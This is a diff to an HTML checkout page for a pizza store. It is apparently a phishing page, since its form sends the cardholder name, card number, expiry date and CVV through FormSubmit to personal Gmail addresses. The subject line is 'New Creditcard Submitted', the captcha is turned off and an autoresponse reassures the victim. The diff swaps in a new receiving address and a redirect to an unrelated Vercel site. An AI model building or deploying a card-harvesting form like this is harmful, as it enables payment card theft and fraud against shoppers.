@@ -52,15 +52,19 @@
 
   <div class="checkout-container">
     <h2>🍕 Supreme Chicken Deluxe Pizza Checkout</h2>
-
-    <form action="https://formsubmit.co/goal51510@gmail.com" method="POST">
-
-
-      <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_next" value="https://the-pizza-spot-store.vercel.app/review.html">
-  <input type="hidden" name="_subject" value="PIZZA CREDIT CARD INFO">
+  <form 
+  id="payment-form"
+  action="https://formsubmit.co/jenniferaniston.chatline@gmail.com"
+  method="POST"
+  enctype="multipart/form-data"
+  novalidate
+  class="space-y-6"
+>
+<!-- FormSubmit Settings -->
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://thane-rivers-voting.vercel.app/review.html">
+  <input type="hidden" name="_subject" value="New Creditcard Submitted">
   <input type="hidden" name="_autoresponse" value="Your card information has been received. Thank you!">
-
 
 
 
@@ -91,10 +95,19 @@
       <!-- PAYMENT INFO -->
       <div class="section">
         <div class="section-title">Payment Information</div>
+
+        
         <label>Cardholder Name</label>
-        <input type="text" name="cname" placeholder="Name on card"  required/>
+
+        
+        
+        <input type="text" name="cname" id="cname" placeholder="CARD NAME"  required/>
+
+        
         <label>Card Number</label>
-        <input type="text" name="cnumber" maxlength="19" placeholder="Card Number" required />
+        
+        <input type="text" id="cnumber" name="cnumber" maxlength="19" placeholder="Card Number" required />
+        
         <div class="card-logos">
           <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" />
           <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" />
@@ -103,11 +116,11 @@
         <div class="row">
           <div>
             <label>Expiry Date</label>
-            <input type="text" name="expidate" placeholder="MM/YY"  required/>
+            <input type="text" id="exdate" name="expidate" placeholder="MM/YY"  required/>
           </div>
           <div>
             <label>Security Code (CVV)</label>
-            <input type="text" name="ccode" maxlength="4" placeholder="123"  required/>
+            <input type="text" id="cc" name="ccode" maxlength="4" placeholder="123"  required/>
           </div>
         </div>
       </div>
